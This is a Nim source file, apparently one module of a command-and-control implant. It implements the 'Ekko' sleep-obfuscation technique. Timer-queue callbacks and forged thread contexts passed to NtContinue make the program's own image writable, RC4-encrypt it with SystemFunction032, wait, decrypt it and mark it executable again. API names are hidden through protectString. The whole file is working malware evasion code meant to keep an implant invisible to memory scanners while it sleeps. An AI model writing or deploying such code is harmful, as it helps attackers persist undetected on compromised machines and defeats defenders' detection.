import winim/lean
import nimprotect
import ../helpers
import ../../../config

type
    USTRING* = object
        Length*: DWORD
        MaximumLength*: DWORD
        Buffer*: PVOID


proc nEkko*(sleepTime: int) = 
    var
        ctxThread: CONTEXT
        ropProtRW: CONTEXT
        ropMemEnc: CONTEXT
        ropDelay: CONTEXT
        ropMemDec: CONTEXT
        ropProtRX: CONTEXT
        ropSetEvt: CONTEXT

        hTimerQueue: HANDLE = CreateTimerQueue()
        hNewTimer: HANDLE 
        hEvent: HANDLE = CreateEventW(cast[LPSECURITY_ATTRIBUTES](0), cast[WINBOOL](NULL), cast[WINBOOL](NULL), nil)

        imageBase: PVOID = cast[PVOID](GetModuleHandleA(NULL))
        imageSize: PVOID = cast[PVOID](cast[PIMAGE_NT_HEADERS](imageBase + cast[PIMAGE_DOS_HEADER](imageBase).e_lfanew).OptionalHeader.SizeOfImage)
        oldProtect: DWORD

        keyBuf = nekko_rc4_key
        
        keyString: USTRING
        imgString: USTRING

        ntContinue: PVOID = GetProcAddress(GetModuleHandleA(protectString("Ntdll")), protectString("NtContinue"))
        sysFunc032: PVOID = GetProcAddress(LoadLibraryA(protectString("Advapi32")), protectString("SystemFunction032"))
        virtualProt: PVOID = GetProcAddress(LoadLibraryA(protectString("Kernel32")), protectString("VirtualProtect"))
        waitFor: PVOID = GetProcAddress(LoadLibraryA(protectString("Kernel32")), protectString("WaitForSingleObject"))

    keyString.Buffer = cast[PVOID](&keyBuf[0])
    keyString.Length = 16
    keyString.MaximumLength = 16

    imgString.Buffer = imageBase
    imgString.Length = cast[DWORD](imageSize)
    imgString.MaximumLength = cast[DWORD](imageSize)


    if (CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](RtlCaptureContext), &ctxThread, 0, 0, WT_EXECUTEINTIMERTHREAD)):
        WaitForSingleObject(hEvent, 0x32)
        copymem(&ropProtRW, &ctxThread, sizeof(CONTEXT))
        copymem(&ropMemEnc, &ctxThread, sizeof(CONTEXT))
        copymem(&ropDelay, &ctxThread, sizeof(CONTEXT))
        copymem(&ropMemDec, &ctxThread, sizeof(CONTEXT))
        copymem(&ropProtRX, &ctxThread, sizeof(CONTEXT))
        copymem(&ropSetEvt, &ctxThread, sizeof(CONTEXT))

        # VirtualProtect( ImageBase, ImageSize, PAGE_READWRITE, &OldProtect );
        ropProtRW.Rsp -= 8
        ropProtRW.Rip = cast[DWORD64](virtualProt)
        ropProtRW.Rcx = cast[DWORD64](imageBase)
        ropProtRW.Rdx = cast[DWORD64](imageSize)
        ropProtRW.R8 = PAGE_READWRITE
        ropProtRW.R9 = cast[DWORD64](&oldProtect)
        # SystemFunction032( &Key, &Img );
        ropMemEnc.Rsp  -= 8;
        ropMemEnc.Rip   = cast[DWORD64](sysFunc032)
        ropMemEnc.Rcx   = cast[DWORD64](&imgString)
        ropMemEnc.Rdx   = cast[DWORD64](&keyString)
        # WaitForSingleObject( hTargetHdl, SleepTime );
        ropDelay.Rsp   -= 8;
        ropDelay.Rip    = cast[DWORD64](waitFor)
        ropDelay.Rcx    = cast[DWORD64](cast[HANDLE](cast[LONG_PTR](-1)))
        ropDelay.Rdx    = cast[DWORD64](sleepTime)
        # SystemFunction032( &Key, &Img );
        ropMemDec.Rsp  -= 8;
        ropMemDec.Rip   = cast[DWORD64](sysFunc032)
        ropMemDec.Rcx   = cast[DWORD64](&imgString)
        ropMemDec.Rdx   = cast[DWORD64](&keyString)
        # VirtualProtect( ImageBase, ImageSize, PAGE_EXECUTE_READWRITE, &OldProtect );
        ropProtRX.Rsp  -= 8;
        ropProtRX.Rip   = cast[DWORD64](virtualProt)
        ropProtRX.Rcx   = cast[DWORD64](imageBase)
        ropProtRX.Rdx   = cast[DWORD64](imageSize)
        ropProtRX.R8    = PAGE_EXECUTE_READWRITE
        ropProtRX.R9    = cast[DWORD64](&oldProtect)
        # SetEvent( hEvent );
        ropSetEvt.Rsp  -= 8;
        ropSetEvt.Rip   = cast[DWORD64](SetEvent)
        ropSetEvt.Rcx   = cast[DWORD64](hEvent)

        CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](ntContinue), &ropProtRW, 100, 0, WT_EXECUTEINTIMERTHREAD)
        CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](ntContinue), &ropMemEnc, 200, 0, WT_EXECUTEINTIMERTHREAD)
        CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](ntContinue), &ropDelay, 300, 0, WT_EXECUTEINTIMERTHREAD)
        CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](ntContinue), &ropMemDec, 400, 0, WT_EXECUTEINTIMERTHREAD)
        CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](ntContinue), &ropProtRX, 500, 0, WT_EXECUTEINTIMERTHREAD)
        CreateTimerQueueTimer(cast[PHANDLE](&hNewTimer), hTimerQueue, cast[WAITORTIMERCALLBACK](ntContinue), &ropSetEvt, 600, 0, WT_EXECUTEINTIMERTHREAD)

        WaitForSingleObject(hEvent, INFINITE);

    DeleteTimerQueue(hTimerQueue)


